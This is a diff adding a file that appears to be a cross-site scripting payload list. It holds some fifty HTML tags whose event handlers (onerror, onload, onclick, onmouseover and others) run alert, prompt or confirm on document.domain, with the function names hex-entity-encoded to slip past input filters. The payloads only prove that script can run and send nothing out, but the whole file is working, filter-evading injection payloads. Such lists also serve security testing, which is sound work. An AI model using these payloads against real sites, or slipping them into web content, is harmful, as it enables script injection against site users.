@@ -1,0 +1,52 @@
+<!-- Alerts -->
+<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>
+<div onmouseover=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>Hover me</div>
+<div ondblclick=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>Double-click me</div>
+<body onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>
+<input type="text" onfocus=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>
+<button onclick=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>Click me</button>
+<body onkeydown=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>
+
+<!-- Prompts -->
+<button onclick=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>Click me</button>
+<body onkeydown=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>
+<textarea onselectstart=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>Select me</textarea>
+<form onsubmit=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)><input type=submit></form>
+<select onchange=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)><option>Choose</option></select>
+<input oncopy=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain) value="Copy me">
+<button ontouchstart=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>Touch me</button>
+
+<!-- Confirmations -->
+<button onclick=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;(document.domain)>Click me</button>
+<div onmousedown=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;(document.domain)>Mouse down</div>
+<input onblur=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;(document.domain)>
+
+<!-- Other events -->
+<a oncontextmenu=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain) href="#">Right-click me</a>
+<button onmouseenter=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;(document.domain)>Mouse enter</button>
+<input onwheel=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>
+
+<!-- More tags -->
+<details ontoggle=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)><summary>Toggle me</summary></details>
+<progress oninput=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain) value=50 max=100></progress>
+<output onforminput=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)></output>
+<abbr title="Abbreviation" onmouseover=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>Hover me</abbr>
+<code onclick=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>Click me</code>
+
+<!-- Additional Events -->
+<div onmousemove=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;(document.domain)>Mouse move</div>
+<button onmousedown=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>Mouse down</button>
+<input onselect=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;(document.domain)>
+<select ondblclick=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)><option>Double-click me</option></select>
+<textarea onfocus=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>Focus me</textarea>
+<a onmouseout=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain) href="#">Mouse out</a>
+<button ontouchend=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>Touch end</button>
+
+<!-- Additional Tags -->
+<fieldset onreset=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;(document.domain)><legend>Reset me</legend></fieldset>
+<small onmouseenter=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>Mouse enter</small>
+<mark onmouseup=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>Mouse up</mark>
+<blockquote onmousedown=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;(document.domain)>Mouse down</blockquote>
+<sub onclick=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>Click me</sub>
+<sup oncontextmenu=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;(document.domain)>Right-click me</sup>
+<dfn ondblclick=&#x61;&#x6C;&#x65;&#x72;&#x74;(document.domain)>Double-click me</dfn>
